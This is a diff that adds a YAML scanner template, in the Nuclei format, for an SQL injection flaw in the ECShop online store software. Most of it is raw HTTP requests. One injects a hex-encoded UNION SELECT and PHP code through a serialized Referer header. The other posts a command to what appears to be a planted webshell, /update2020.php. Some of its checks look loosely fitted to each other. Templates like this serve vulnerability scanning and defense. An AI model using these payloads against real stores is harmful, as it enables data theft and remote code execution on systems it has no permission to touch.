@@ -1,0 +1,56 @@
+id: ecshop-2x-3x-sqli
+info:
+  name: ECShop 2.x/3.x SQLi
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ECShop is a B2C independent online store system, suitable for enterprises and individuals to quickly build personalized online stores. In its 2017 and previous versions, there exists a SQL injection vulnerability that can lead to data leakage or code execution.
+  reference:
+    - https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md
+  tags: sqli, ecshop
+
+variables:
+  cmd: "echo md5(2);"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    raw:
+      - |
+        GET /user.php?act=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
+        Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:121:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b7661725f64756d70286d643509283129293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
+
+  - id: exploit-execution
+    raw:
+      - |
+        POST /update2020.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        996={{cmd}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "996"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "ecshop [2|3]\\.x webshell is (.*?)"
